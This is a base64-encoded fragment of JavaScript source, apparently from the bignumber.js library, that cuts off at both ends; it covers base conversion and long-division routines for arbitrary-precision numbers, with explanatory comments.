vP1xyXG4gICAgICAgIGlmIChpIDwgMCkge1xyXG4gICAgICAgICAgYyA9IFtlID0gMF07XHJcbiAgICAgICAgfSBlbHNlIHtcclxuXHJcbiAgICAgICAgICAvLyBSZW1vdmUgbGVhZGluZyBlbGVtZW50cyB3aGljaCBhcmUgemVybyBhbmQgYWRqdXN0IGV4cG9uZW50IGFjY29yZGluZ2x5LlxyXG4gICAgICAgICAgZm9yIChlID0gLTEgOyBjWzBdID09PSAwOyBjLnNwbGljZSgwLCAxKSwgZSAtPSBMT0dfQkFTRSk7XHJcblxyXG4gICAgICAgICAgLy8gQ291bnQgdGhlIGRpZ2l0cyBvZiB0aGUgZmlyc3QgZWxlbWVudCBvZiBjIHRvIGRldGVybWluZSBsZWFkaW5nIHplcm9zLCBhbmQuLi5cclxuICAgICAgICAgIGZvciAoaSA9IDEsIHYgPSBjWzBdOyB2ID49IDEwOyB2IC89IDEwLCBpKyspO1xyXG5cclxuICAgICAgICAgIC8vIGFkanVzdCB0aGUgZXhwb25lbnQgYWNjb3JkaW5nbHkuXHJcbiAgICAgICAgICBpZiAoaSA8IExPR19CQVNFKSBlIC09IExPR19CQVNFIC0gaTtcclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIHJhbmQuZSA9IGU7XHJcbiAgICAgICAgcmFuZC5jID0gYztcclxuICAgICAgICByZXR1cm4gcmFuZDtcclxuICAgICAgfTtcclxuICAgIH0pKCk7XHJcblxyXG5cclxuICAgIC8vIFBSSVZBVEUgRlVOQ1RJT05TXHJcblxyXG5cclxuICAgIC8vIENhbGxlZCBieSBCaWdOdW1iZXIgYW5kIEJpZ051bWJlci5wcm90b3R5cGUudG9TdHJpbmcuXHJcbiAgICBjb252ZXJ0QmFzZSA9IChmdW5jdGlvbiAoKSB7XHJcbiAgICAgIHZhciBkZWNpbWFsID0gJzAxMjM0NTY3ODknO1xyXG5cclxuICAgICAgLypcclxuICAgICAgICogQ29udmVydCBzdHJpbmcgb2YgYmFzZUluIHRvIGFuIGFycmF5IG9mIG51bWJlcnMgb2YgYmFzZU91dC5cclxuICAgICAgICogRWcuIHRvQmFzZU91dCgnMjU1JywgMTAsIDE2KSByZXR1cm5zIFsxNSwgMTVdLlxyXG4gICAgICAgKiBFZy4gdG9CYXNlT3V0KCdmZicsIDE2LCAxMCkgcmV0dXJucyBbMiwgNSwgNV0uXHJcbiAgICAgICAqL1xyXG4gICAgICBmdW5jdGlvbiB0b0Jhc2VPdXQoc3RyLCBiYXNlSW4sIGJhc2VPdXQsIGFscGhhYmV0KSB7XHJcbiAgICAgICAgdmFyIGosXHJcbiAgICAgICAgICBhcnIgPSBbMF0sXHJcbiAgICAgICAgICBhcnJMLFxyXG4gICAgICAgICAgaSA9IDAsXHJcbiAgICAgICAgICBsZW4gPSBzdHIubGVuZ3RoO1xyXG5cclxuICAgICAgICBmb3IgKDsgaSA8IGxlbjspIHtcclxuICAgICAgICAgIGZvciAoYXJyTCA9IGFyci5sZW5ndGg7IGFyckwtLTsgYXJyW2FyckxdICo9IGJhc2VJbik7XHJcblxyXG4gICAgICAgICAgYXJyWzBdICs9IGFscGhhYmV0LmluZGV4T2Yoc3RyLmNoYXJBdChpKyspKTtcclxuXHJcbiAgICAgICAgICBmb3IgKGogPSAwOyBqIDwgYXJyLmxlbmd0aDsgaisrKSB7XHJcblxyXG4gICAgICAgICAgICBpZiAoYXJyW2pdID4gYmFzZU91dCAtIDEpIHtcclxuICAgICAgICAgICAgICBpZiAoYXJyW2ogKyAxXSA9PSBudWxsKSBhcnJbaiArIDFdID0gMDtcclxuICAgICAgICAgICAgICBhcnJbaiArIDFdICs9IGFycltqXSAvIGJhc2VPdXQgfCAwO1xyXG4gICAgICAgICAgICAgIGFycltqXSAlPSBiYXNlT3V0O1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgICB9XHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICByZXR1cm4gYXJyLnJldmVyc2UoKTtcclxuICAgICAgfVxyXG5cclxuICAgICAgLy8gQ29udmVydCBhIG51bWVyaWMgc3RyaW5nIG9mIGJhc2VJbiB0byBhIG51bWVyaWMgc3RyaW5nIG9mIGJhc2VPdXQuXHJcbiAgICAgIC8vIElmIHRoZSBjYWxsZXIgaXMgdG9TdHJpbmcsIHdlIGFyZSBjb252ZXJ0aW5nIGZyb20gYmFzZSAxMCB0byBiYXNlT3V0LlxyXG4gICAgICAvLyBJZiB0aGUgY2FsbGVyIGlzIEJpZ051bWJlciwgd2UgYXJlIGNvbnZlcnRpbmcgZnJvbSBiYXNlSW4gdG8gYmFzZSAxMC5cclxuICAgICAgcmV0dXJuIGZ1bmN0aW9uIChzdHIsIGJhc2VJbiwgYmFzZU91dCwgc2lnbiwgY2FsbGVySXNUb1N0cmluZykge1xyXG4gICAgICAgIHZhciBhbHBoYWJldCwgZCwgZSwgaywgciwgeCwgeGMsIHksXHJcbiAgICAgICAgICBpID0gc3RyLmluZGV4T2YoJy4nKSxcclxuICAgICAgICAgIGRwID0gREVDSU1BTF9QTEFDRVMsXHJcbiAgICAgICAgICBybSA9IFJPVU5ESU5HX01PREU7XHJcblxyXG4gICAgICAgIC8vIE5vbi1pbnRlZ2VyLlxyXG4gICAgICAgIGlmIChpID49IDApIHtcclxuICAgICAgICAgIGsgPSBQT1dfUFJFQ0lTSU9OO1xyXG5cclxuICAgICAgICAgIC8vIFVubGltaXRlZCBwcmVjaXNpb24uXHJcbiAgICAgICAgICBQT1dfUFJFQ0lTSU9OID0gMDtcclxuICAgICAgICAgIHN0ciA9IHN0ci5yZXBsYWNlKCcuJywgJycpO1xyXG4gICAgICAgICAgeSA9IG5ldyBCaWdOdW1iZXIoYmFzZUluKTtcclxuICAgICAgICAgIHggPSB5LnBvdyhzdHIubGVuZ3RoIC0gaSk7XHJcbiAgICAgICAgICBQT1dfUFJFQ0lTSU9OID0gaztcclxuXHJcbiAgICAgICAgICAvLyBDb252ZXJ0IHN0ciBhcyBpZiBhbiBpbnRlZ2VyLCB0aGVuIHJlc3RvcmUgdGhlIGZyYWN0aW9uIHBhcnQgYnkgZGl2aWRpbmcgdGhlXHJcbiAgICAgICAgICAvLyByZXN1bHQgYnkgaXRzIGJhc2UgcmFpc2VkIHRvIGEgcG93ZXIuXHJcblxyXG4gICAgICAgICAgeS5jID0gdG9CYXNlT3V0KHRvRml4ZWRQb2ludChjb2VmZlRvU3RyaW5nKHguYyksIHguZSwgJzAnKSxcclxuICAgICAgICAgICAxMCwgYmFzZU91dCwgZGVjaW1hbCk7XHJcbiAgICAgICAgICB5LmUgPSB5LmMubGVuZ3RoO1xyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgLy8gQ29udmVydCB0aGUgbnVtYmVyIGFzIGludGVnZXIuXHJcblxyXG4gICAgICAgIHhjID0gdG9CYXNlT3V0KHN0ciwgYmFzZUluLCBiYXNlT3V0LCBjYWxsZXJJc1RvU3RyaW5nXHJcbiAgICAgICAgID8gKGFscGhhYmV0ID0gQUxQSEFCRVQsIGRlY2ltYWwpXHJcbiAgICAgICAgIDogKGFscGhhYmV0ID0gZGVjaW1hbCwgQUxQSEFCRVQpKTtcclxuXHJcbiAgICAgICAgLy8geGMgbm93IHJlcHJlc2VudHMgc3RyIGFzIGFuIGludGVnZXIgYW5kIGNvbnZlcnRlZCB0byBiYXNlT3V0LiBlIGlzIHRoZSBleHBvbmVudC5cclxuICAgICAgICBlID0gayA9IHhjLmxlbmd0aDtcclxuXHJcbiAgICAgICAgLy8gUmVtb3ZlIHRyYWlsaW5nIHplcm9zLlxyXG4gICAgICAgIGZvciAoOyB4Y1stLWtdID09IDA7IHhjLnBvcCgpKTtcclxuXHJcbiAgICAgICAgLy8gWmVybz9cclxuICAgICAgICBpZiAoIXhjWzBdKSByZXR1cm4gYWxwaGFiZXQuY2hhckF0KDApO1xyXG5cclxuICAgICAgICAvLyBEb2VzIHN0ciByZXByZXNlbnQgYW4gaW50ZWdlcj8gSWYgc28sIG5vIG5lZWQgZm9yIHRoZSBkaXZpc2lvbi5cclxuICAgICAgICBpZiAoaSA8IDApIHtcclxuICAgICAgICAgIC0tZTtcclxuICAgICAgICB9IGVsc2Uge1xyXG4gICAgICAgICAgeC5jID0geGM7XHJcbiAgICAgICAgICB4LmUgPSBlO1xyXG5cclxuICAgICAgICAgIC8vIFRoZSBzaWduIGlzIG5lZWRlZCBmb3IgY29ycmVjdCByb3VuZGluZy5cclxuICAgICAgICAgIHgucyA9IHNpZ247XHJcbiAgICAgICAgICB4ID0gZGl2KHgsIHksIGRwLCBybSwgYmFzZU91dCk7XHJcbiAgICAgICAgICB4YyA9IHguYztcclxuICAgICAgICAgIHIgPSB4LnI7XHJcbiAgICAgICAgICBlID0geC5lO1xyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgLy8geGMgbm93IHJlcHJlc2VudHMgc3RyIGNvbnZlcnRlZCB0byBiYXNlT3V0LlxyXG5cclxuICAgICAgICAvLyBUSGUgaW5kZXggb2YgdGhlIHJvdW5kaW5nIGRpZ2l0LlxyXG4gICAgICAgIGQgPSBlICsgZHAgKyAxO1xyXG5cclxuICAgICAgICAvLyBUaGUgcm91bmRpbmcgZGlnaXQ6IHRoZSBkaWdpdCB0byB0aGUgcmlnaHQgb2YgdGhlIGRpZ2l0IHRoYXQgbWF5IGJlIHJvdW5kZWQgdXAuXHJcbiAgICAgICAgaSA9IHhjW2RdO1xyXG5cclxuICAgICAgICAvLyBMb29rIGF0IHRoZSByb3VuZGluZyBkaWdpdHMgYW5kIG1vZGUgdG8gZGV0ZXJtaW5lIHdoZXRoZXIgdG8gcm91bmQgdXAuXHJcblxyXG4gICAgICAgIGsgPSBiYXNlT3V0IC8gMjtcclxuICAgICAgICByID0gciB8fCBkIDwgMCB8fCB4Y1tkICsgMV0gIT0gbnVsbDtcclxuXHJcbiAgICAgICAgciA9IHJtIDwgNCA/IChpICE9IG51bGwgfHwgcikgJiYgKHJtID09IDAgfHwgcm0gPT0gKHgucyA8IDAgPyAzIDogMikpXHJcbiAgICAgICAgICAgICAgOiBpID4gayB8fCBpID09IGsgJiYocm0gPT0gNCB8fCByIHx8IHJtID09IDYgJiYgeGNbZCAtIDFdICYgMSB8fFxyXG4gICAgICAgICAgICAgICBybSA9PSAoeC5zIDwgMCA/IDggOiA3KSk7XHJcblxyXG4gICAgICAgIC8vIElmIHRoZSBpbmRleCBvZiB0aGUgcm91bmRpbmcgZGlnaXQgaXMgbm90IGdyZWF0ZXIgdGhhbiB6ZXJvLCBvciB4YyByZXByZXNlbnRzXHJcbiAgICAgICAgLy8gemVybywgdGhlbiB0aGUgcmVzdWx0IG9mIHRoZSBiYXNlIGNvbnZlcnNpb24gaXMgemVybyBvciwgaWYgcm91bmRpbmcgdXAsIGEgdmFsdWVcclxuICAgICAgICAvLyBzdWNoIGFzIDAuMDAwMDEuXHJcbiAgICAgICAgaWYgKGQgPCAxIHx8ICF4Y1swXSkge1xyXG5cclxuICAgICAgICAgIC8vIDFeLWRwIG9yIDBcclxuICAgICAgICAgIHN0ciA9IHIgPyB0b0ZpeGVkUG9pbnQoYWxwaGFiZXQuY2hhckF0KDEpLCAtZHAsIGFscGhhYmV0LmNoYXJBdCgwKSlcclxuICAgICAgICAgICAgICA6IGFscGhhYmV0LmNoYXJBdCgwKTtcclxuICAgICAgICB9IGVsc2Uge1xyXG5cclxuICAgICAgICAgIC8vIFRydW5jYXRlIHhjIHRvIHRoZSByZXF1aXJlZCBudW1iZXIgb2YgZGVjaW1hbCBwbGFjZXMuXHJcbiAgICAgICAgICB4Yy5sZW5ndGggPSBkO1xyXG5cclxuICAgICAgICAgIC8vIFJvdW5kIHVwP1xyXG4gICAgICAgICAgaWYgKHIpIHtcclxuXHJcbiAgICAgICAgICAgIC8vIFJvdW5kaW5nIHVwIG1heSBtZWFuIHRoZSBwcmV2aW91cyBkaWdpdCBoYXMgdG8gYmUgcm91bmRlZCB1cCBhbmQgc28gb24uXHJcbiAgICAgICAgICAgIGZvciAoLS1iYXNlT3V0OyArK3hjWy0tZF0gPiBiYXNlT3V0Oykge1xyXG4gICAgICAgICAgICAgIHhjW2RdID0gMDtcclxuXHJcbiAgICAgICAgICAgICAgaWYgKCFkKSB7XHJcbiAgICAgICAgICAgICAgICArK2U7XHJcbiAgICAgICAgICAgICAgICB4YyA9IFsxXS5jb25jYXQoeGMpO1xyXG4gICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfVxyXG4gICAgICAgICAgfVxyXG5cclxuICAgICAgICAgIC8vIERldGVybWluZSB0cmFpbGluZyB6ZXJvcy5cclxuICAgICAgICAgIGZvciAoayA9IHhjLmxlbmd0aDsgIXhjWy0ta107KTtcclxuXHJcbiAgICAgICAgICAvLyBFLmcuIFs0LCAxMSwgMTVdIGJlY29tZXMgNGJmLlxyXG4gICAgICAgICAgZm9yIChpID0gMCwgc3RyID0gJyc7IGkgPD0gazsgc3RyICs9IGFscGhhYmV0LmNoYXJBdCh4Y1tpKytdKSk7XHJcblxyXG4gICAgICAgICAgLy8gQWRkIGxlYWRpbmcgemVyb3MsIGRlY2ltYWwgcG9pbnQgYW5kIHRyYWlsaW5nIHplcm9zIGFzIHJlcXVpcmVkLlxyXG4gICAgICAgICAgc3RyID0gdG9GaXhlZFBvaW50KHN0ciwgZSwgYWxwaGFiZXQuY2hhckF0KDApKTtcclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIC8vIFRoZSBjYWxsZXIgd2lsbCBhZGQgdGhlIHNpZ24uXHJcbiAgICAgICAgcmV0dXJuIHN0cjtcclxuICAgICAgfTtcclxuICAgIH0pKCk7XHJcblxyXG5cclxuICAgIC8vIFBlcmZvcm0gZGl2aXNpb24gaW4gdGhlIHNwZWNpZmllZCBiYXNlLiBDYWxsZWQgYnkgZGl2IGFuZCBjb252ZXJ0QmFzZS5cclxuICAgIGRpdiA9IChmdW5jdGlvbiAoKSB7XHJcblxyXG4gICAgICAvLyBBc3N1bWUgbm9uLXplcm8geCBhbmQgay5cclxuICAgICAgZnVuY3Rpb24gbXVsdGlwbHkoeCwgaywgYmFzZSkge1xyXG4gICAgICAgIHZhciBtLCB0ZW1wLCB4bG8sIHhoaSxcclxuICAgICAgICAgIGNhcnJ5ID0gMCxcclxuICAgICAgICAgIGkgPSB4Lmxlbmd0aCxcclxuICAgICAgICAgIGtsbyA9IGsgJSBTUVJUX0JBU0UsXHJcbiAgICAgICAgICBraGkgPSBrIC8gU1FSVF9CQVNFIHwgMDtcclxuXHJcbiAgICAgICAgZm9yICh4ID0geC5zbGljZSgpOyBpLS07KSB7XHJcbiAgICAgICAgICB4bG8gPSB4W2ldICUgU1FSVF9CQVNFO1xyXG4gICAgICAgICAgeGhpID0geFtpXSAvIFNRUlRfQkFTRSB8IDA7XHJcbiAgICAgICAgICBtID0ga2hpICogeGxvICsgeGhpICoga2xvO1xyXG4gICAgICAgICAgdGVtcCA9IGtsbyAqIHhsbyArICgobSAlIFNRUlRfQkFTRSkgKiBTUVJUX0JBU0UpICsgY2Fycnk7XHJcbiAgICAgICAgICBjYXJyeSA9ICh0ZW1wIC8gYmFzZSB8IDApICsgKG0gLyBTUVJUX0JBU0UgfCAwKSArIGtoaSAqIHhoaTtcclxuICAgICAgICAgIHhbaV0gPSB0ZW1wICUgYmFzZTtcclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIGlmIChjYXJyeSkgeCA9IFtjYXJyeV0uY29uY2F0KHgpO1xyXG5cclxuICAgICAgICByZXR1cm4geDtcclxuICAgICAgfVxyXG5cclxuICAgICAgZnVuY3Rpb24gY29tcGFyZShhLCBiLCBhTCwgYkwpIHtcclxuICAgICAgICB2YXIgaSwgY21wO1xyXG5cclxuICAgICAgICBpZiAoYUwgIT0gYkwpIHtcclxuICAgICAgICAgIGNtcCA9IGFMID4gYkwgPyAxIDogLTE7XHJcbiAgICAgICAgfSBlbHNlIHtcclxuXHJcbiAgICAgICAgICBmb3IgKGkgPSBjbXAgPSAwOyBpIDwgYUw7IGkrKykge1xyXG5cclxuICAgICAgICAgICAgaWYgKGFbaV0gIT0gYltpXSkge1xyXG4gICAgICAgICAgICAgIGNtcCA9IGFbaV0gPiBiW2ldID8gMSA6IC0xO1xyXG4gICAgICAgICAgICAgIGJyZWFrO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgICB9XHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICByZXR1cm4gY21wO1xyXG4gICAgICB9XHJcblxyXG4gICAgICBmdW5jdGlvbiBzdWJ0cmFjdChhLCBiLCBhTCwgYmFzZSkge1xyXG4gICAgICAgIHZhciBpID0gMDtcclxuXHJcbiAgICAgICAgLy8gU3VidHJhY3QgYiBmcm9tIGEuXHJcbiAgICAgICAgZm9yICg7IGFMLS07KSB7XHJcbiAgICAgICAgICBhW2FMXSAtPSBpO1xyXG4gICAgICAgICAgaSA9IGFbYUxdIDwgYlthTF0gPyAxIDogMDtcclxuICAgICAgICAgIGFbYUxdID0gaSAqIGJhc2UgKyBhW2FMXSAtIGJbYUxdO1xyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgLy8gUmVtb3ZlIGxlYWRpbmcgemVyb3MuXHJcbiAgICAgICAgZm9yICg7ICFhWzBdICYmIGEubGVuZ3RoID4gMTsgYS5zcGxpY2UoMCwgMSkpO1xyXG4gICAgICB9XHJcblxyXG4gICAgICAvLyB4OiBkaXZpZGVuZCwgeTogZGl2aXNvci5cclxuICAgICAgcmV0dXJuIGZ1bmN0aW9uICh4LCB5LCBkcCwgcm0sIGJhc2UpIHtcclxuICAgICAgICB2YXIgY21wLCBlLCBpLCBtb3JlLCBuLCBwcm9kLCBwcm9kTCwgcSwgcWMsIHJlbSwgcmVtTCwgcmVtMCwgeGksIHhMLCB5YzAsXHJcbiAgICAgICAgICB5TCwgeXosXHJcbiAgICAgICAgICBzID0geC5zID09IHkucyA/IDEgOiAtMSxcclxuICAgICAgICAgIHhjID0geC5jLFxyXG4gICAgICAgICAgeWMgPSB5LmM7XHJcblxyXG4gICAgICAgIC8vIEVpdGhlciBOYU4sIEluZmluaXR5IG9yIDA/XHJcbiAgICAgICAgaWYgKCF4YyB8fCAheGNbMF0gfHwgIXljIHx8ICF5Y1swXSkge1xyXG5cclxuICAgICAgICAgIHJldHVybiBuZXcgQmlnTnVtYmVyKFxyXG5cclxuICAgICAgICAgICAvLyBSZXR1cm4gTmFOIGlmIGVpdGhlciBOYU4sIG9yIGJvdGggSW5maW5pdHkgb3IgMC5cclxuICAgICAgICAgICAheC5zIHx8ICF5LnMgfHwgKHhjID8geWMgJiYgeGNbMF0gPT0geWNbMF0gOiAheWMpID8gTmFOIDpcclxuXHJcbiAgICAgICAgICAgIC8vIFJldHVybiDljaQwIGlmIHggaXMg5Y2kMCBvciB5IGlzIOWNpEluZmluaXR5LCBvciByZXR1cm4g5Y2kSW5maW5pdHkgYXMgeSBpcyDljaQwLlxyXG4gICAgICAgICAgICB4YyAmJiB4Y1swXSA9PSAwIHx8ICF5YyA/IHMgKiAwIDogcyAvIDBcclxuICAgICAgICAgKTtcclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIHEgPSBuZXcgQmlnTnVtYmVyKHMpO1xyXG4gICAgICAgIHFjID0gcS5jID0gW107XHJcbiAgICAgICAgZSA9IHguZSAtIHkuZTtcclxuICAgICAgICBzID0gZHAgKyBlICsgMTtcclxuXHJcbiAgICAgICAgaWYgKCFiYXNlKSB7XHJcbiAgICAgICAgICBiYXNlID0gQkFTRTtcclxuICAgICAgICAgIGUgPSBiaXRGbG9vcih4LmUgLyBMT0dfQkFTRSkgLSBiaXRGbG9vcih5LmUgLyBMT0dfQkFTRSk7XHJcbiAgICAgICAgICBzID0gcyAvIExPR19CQVNFIHwgMDtcclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIC8vIFJlc3VsdCBleHBvbmVudCBtYXkgYmUgb25lIGxlc3MgdGhlbiB0aGUgY3VycmVudCB2YWx1ZSBvZiBlLlxyXG4gICAgICAgIC8vIFRoZSBjb2VmZmljaWVudHMgb2YgdGhlIEJpZ051bWJlcnMgZnJvbSBjb252ZXJ0QmFzZSBtYXkgaGF2ZSB0cmFpbGluZyB6ZXJvcy5cclxuICAgICAgICBmb3IgKGkgPSAwOyB5Y1tpXSA9PSAoeGNbaV0gfHwgMCk7IGkrKyk7XHJcblxyXG4gICAgICAgIGlmICh5Y1tpXSA+ICh4Y1tpXSB8fCAwKSkgZS0tO1xyXG5cclxuICAgICAgICBpZiAocyA8IDApIHtcclxuICAgICAgICAgIHFjLnB1c2goMSk7XHJcbiAgICAgICAgICBtb3JlID0gdHJ1ZTtcclxuICAgICAgICB9IGVsc2Uge1xyXG4gICAgICAgICAgeEwgPSB4Yy5sZW5ndGg7XHJcbiAgICAgICAgICB5TCA9IHljLmxlbmd0aDtcclxuICAgICAgICAgIGkgPSAwO1xyXG4gICAgICAgICAgcyArPSAyO1xyXG5cclxuICAgICAgICAgIC8vIE5vcm1hbGlzZSB4YyBhbmQgeWMgc28gaGlnaGVzdCBvcmRlciBkaWdpdCBvZiB5YyBpcyA+PSBiYXNlIC8gMi5cclxuXHJcbiAgICAgICAgICBuID0gbWF0aGZsb29yKGJhc2UgLyAoeWNbMF0gKyAxKSk7XHJcblxyXG4gICAgICAgICAgLy8gTm90IG5lY2Vzc2FyeSwgYnV0IHRvIGhhbmRsZSBvZGQgYmFzZXMgd2hlcmUgeWNbMF0gPT0gKGJhc2UgLyAyKSAtIDEuXHJcbiAgICAgICAgICAvLyBpZiAobiA+IDEgfHwgbisrID09IDEgJiYgeWNbMF0gPCBiYXNlIC8gMikge1xyXG4gICAgICAgICAgaWYgKG4gPiAxKSB7XHJcbiAgICAgICAgICAgIHljID0gbXVsdGlwbHkoeWMsIG4sIGJhc2UpO1xyXG4gICAgICAgICAgICB4YyA9IG11bHRpcGx5KHhjLCBuLCBiYXNlKTtcclxuICAgICAgICAgICAgeUwgPSB5Yy5sZW5ndGg7XHJcbiAgICAgICAgICAgIHhMID0geGMubGVuZ3RoO1xyXG4gICAgICAgICAgfVxyXG5cclxuICAgICAgICAgIHhpID0geUw7XHJcbiAgICAgICAgICByZW0gPSB4Yy5zbGljZSgwLCB5TCk7XHJcbiAgICAgICAgICByZW1MID0gcmVtLmxlbmd0aDtcclxuXHJcbiAgICAgICAgICAvLyBBZGQgemVyb3MgdG8gbWFrZSByZW1haW5kZXIgYXMgbG9uZyBhcyBkaXZpc29yLlxyXG4gICAgICAgICAgZm9yICg7IHJlbUwgPCB5TDsgcmVtW3JlbUwrK10gPSAwKTtcclxuICAgICAgICAgIHl6ID0geWMuc2xpY2UoKTtcclxuICAgICAgICAgIHl6ID0gWzBdLmNvbmNhdCh5eik7XHJcbiAgICAgICAgICB5YzAgPSB5Y1swXTtcclxuICAgICAgICAgIGlmICh5Y1sxXSA+PSBiYXNlIC8gMikgeWMwKys7XHJcbiAgICAgICAgICAvLyBOb3QgbmVjZXNzYXJ5LCBidXQgdG8gcHJldmVudCB0cmlhbCBkaWdpdCBuID4gYmFzZSwgd2hlbiB1c2luZyBiYXNlIDMuXHJcbiAgICAgICAgICAvLyBlbHNlIGlmIChiYXNlID09IDMgJiYgeWMwID09IDEpIHljMCA9IDEgKyAxZS0xNTtcclxuXHJcbiAgICAgICAgICBkbyB7XHJcbiAgICAgICAgICAgIG4gPSAwO1xyXG5cclxuICAgICAgICAgICAgLy8gQ29tcGFyZSBkaXZpc29yIGFuZCByZW1haW5kZXIuXHJcbiAgICAgICAgICAgIGNtcCA9IGNvbXBhcmUoeWMsIHJlbSwgeUwsIHJlbUwpO1xyXG5cclxuICAgICAgICAgICAgLy8gSWYgZGl2aXNvciA8IHJlbWFpbmRlci5cclxuICAgICAgICAgICAgaWYgKGNtcCA8IDApIHtcclxuXHJcbiAgICAgICAgICAgICAgLy8gQ2FsY3VsYXRlIHRyaWFsIGRpZ2l0LCBuLlxyXG5cclxuICAgICAgICAgICAgICByZW0wID0gcmVtWzBdO1xyXG4gICAgICAgICAgICAgIGlmICh5TCAhPSByZW1MKSByZW0wID0gcmVtMCAqIGJhc2UgKyAocmVtWzFdIHx8IDApO1xyXG5cclxuICAgICAgICAgICAgICAvLyBuIGlzIGhvdyBtYW55IHRpbWVzIHRoZSBkaXZpc29yIGdvZXMgaW50byB0aGUgY3VycmVudCByZW1haW5kZXIuXHJcbiAgICAgICAgICAgICAgbiA9IG1hdGhmbG9vcihyZW0wIC8geWMwKTtcclxuXHJcbiAgICAgICAgICAgICAgLy8gIEFsZ29yaXRobTpcclxuICAgICAgICAgICAgICAvLyAgcHJvZHVjdCA9IGRpdmlzb3IgbXVsdGlwbGllZCBieSB0cmlhbCBkaWdpdCAobikuXHJcbiAgICAgICAgICAgICAgLy8gIENvbXBhcmUgcHJvZHVjdCBhbmQgcmVtYWluZGVyLlxyXG4gICAgICAgICAgICAgIC8vICBJZiBwcm9kdWN0IGlzIGdyZWF0ZXIgdGhhbiByZW1haW5kZXI6XHJcbiAgICAgICAgICAgICAgLy8gICAgU3VidHJhY3QgZGl2aXNvciBmcm9tIHByb2R1Y3QsIGRlY3JlbWVudCB0cmlhbCBkaWdpdC5cclxuICAgICAgICAgICAgICAvLyAgU3VidHJhY3QgcHJvZHVjdCBmcm9tIHJlbWFpbmRlci5cclxuICAgICAgICAgICAgICAvLyAgSWYgcHJvZHVjdCB3YXMgbGVzcyB0aGFuIHJlbWFpbmRlciBhdCB0aGUgbGFzdCBjb21wYXJlOlxyXG4gICAgICAgICAgICAgIC8vICAgIENvbXBhcmUgbmV3IHJlbWFpbmRlciBhbmQgZGl2aXNvci5cclxuICAgICAgICAgICAgICAvLyAgICBJZiByZW1haW5kZXIgaXMgZ3JlYXRlciB0aGFuIGRpdmlzb3I6XHJcbiAgICAgICAgICAgICAgLy8gICAgICBTdWJ0cmFjdCBkaXZpc29yIGZyb20gcmVtYWluZGVyLCBpbmNyZW1lbnQgdHJpYWwgZGlnaXQuXHJcblxyXG4gICAgICAgICAgICAgIGlmIChuID4gMSkge1xyXG5cclxuICAgICAgICAgICAgICAgIC8vIG4gbWF5IGJlID4gYmFzZSBvbmx5IHdoZW4gYmFzZSBpcyAzLlxyXG4gICAgICAgICAgICAgICAgaWYgKG4gPj0gYmFzZSkgbiA9IGJhc2UgLSAxO1xyXG5cclxuICAgICAgICAgICAgICAgIC8vIHByb2R1Y3QgPSBkaXZpc29yICogdHJpYWwgZGlnaXQuXHJcbiAgICAgICAgICAgICAgICBwcm9kID0gbXVsdGlwbHkoeWMsIG4sIGJhc2UpO1xyXG4gICAgICAgICAgICAgICAgcHJvZEwgPSBwcm9kLmxlbmd0aDtcclxuICAgICAgICAgICAgICAgIHJlbUwgPSByZW0ubGVuZ3RoO1xyXG5cclxuICAgICAgICAgICAgICAgIC8vIENvbXBhcmUgcHJvZHVjdCBhbmQgcmVtYWluZGVyLlxyXG4gICAgICAgICAgICAgICAgLy8gSWYgcHJvZHVjdCA+IHJlbWFpbmRlciB0aGVuIHRyaWFsIGRpZ2l0IG4gdG9vIGhpZ2guXHJcbiAgICAgICAgICAgICAgICAvLyBuIGlzIDEgdG9vIGhpZ2ggYWJvdXQgNSUgb2YgdGhlIHRpbWUsIGFuZCBpcyBub3Qga25vd24gdG8gaGF2ZVxyXG4gICAgICAgICAgICAgICAgLy8gZXZlciBiZWVuIG1vcmUgdGhhbiAxIHRvbyBoaWdoLlxyXG4gICAgICAgICAgICAgICAgd2hpbGUgKGNvbXBhcmUocHJvZCwgcmVtLCBwcm9kTCwgcmVtTCkgPT0gMSkge1xyXG4gICAgICAgICAgICAgICAgICBuLS07XHJcblxyXG4gICAgICAgICAgICAgICAgICAvLyBTdWJ0cmFjdCBkaXZpc29yIGZyb20gcHJvZHVjdC5cclxuICAgICAgICAgICAgICAgICAgc3VidHJhY3QocHJvZCwgeUwgPCBwcm9kTCA/IHl6IDogeWMsIHByb2RMLCBiYXNlKTtcclxuICAgICAgICAgICAgICAgICAgcHJvZEwgPSBwcm9kLmxlbmd0aDtcclxuICAgICAgICAgICAgICAgICAgY21wID0gMTtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICB9IGVsc2Uge1xyXG5cclxuICAgICAgICAgICAgICAgIC8vIG4gaXMgMCBvciAxLCBjbXAgaXMgLTEuXHJcbiAgICAgICAgICAgICAgICAvLyBJZiBuIGlzIDAsIHRoZXJlIGlzIG5vIG5lZWQgdG8gY29tcGFyZSB5YyBhbmQgcmVtIGFnYWluIGJlbG93LFxyXG4gICAgICAgICAgICAgICAgLy8gc28gY2hhbmdlIGNtcCB0byAxIHRvIGF2b2lkIGl0LlxyXG4gICAgICAgICAgICAgICAgLy8gSWYgbiBpcyAxLCBsZWF2ZSBjbXAgYXMgLTEsIHNvIHljIGFuZCByZW0gYXJlIGNvbXBhcmVkIGFnYWluLlxyXG4gICAgICAgICAgICAgICAgaWYgKG4gPT0gMCkge1xyXG5cclxuICAgICAgICAgICAgICAgICAgLy8gZGl2aXNvciA8IHJlbWFpbmRlciwgc28gbiBtdXN0IGJlIGF0IGxlYXN0IDEuXHJcbiAgICAgICAgICAgICAgICAgIGNtcCA9IG4gPSAxO1xyXG4gICAgICAgICAgICAgICAgfVxyXG5cclxuICAgICAgICAgICAgICAgIC8vIHByb2R1Y3QgPSBkaXZpc29yXHJcbiAgICAgICAgICAgICAgICBwcm9kID0geWMuc2xpY2UoKTtcclxuICAgICAgICAgICAgICAgIHByb2RMID0gcHJvZC5sZW5ndGg7XHJcbiAgICAgICAgICAgICAgfVxyXG5cclxuICAgICAgICAgICAgICBpZiAocHJvZEwgPCByZW1MKSBwcm9kID0gWzBdLmN